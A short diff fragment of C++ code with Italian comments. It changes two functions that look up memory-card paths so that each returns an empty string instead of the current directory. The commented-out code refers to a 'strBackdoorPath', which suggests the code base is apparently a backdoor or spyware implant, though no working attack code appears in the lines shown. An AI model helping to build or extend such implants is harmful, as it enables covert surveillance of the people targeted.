@@ -131,7 +131,8 @@ wstring GetFirstMMCPath(const PWCHAR pInFile) {
 
 	return strBackdoorPath;
 ***/
-	return L".\\"; //ByGIO
+	//return L".\\"; //ByGIO
+	return L""; //ByGIO
 }
 
 // Come la precedente ma torna il path della seconda MMC se presente, NULL
@@ -178,7 +179,8 @@ wstring GetSecondMMCPath(const PWCHAR pInFile) {
 
 	return strBackdoorPath;
 ***/
-	return L".\\"; //ByGIO
+	//return L".\\"; //ByGIO
+	return L""; //ByGIO
 }
 
 // Torna l'HANDLE (e quindi anche l'ID) di un processo, l'HANDLE
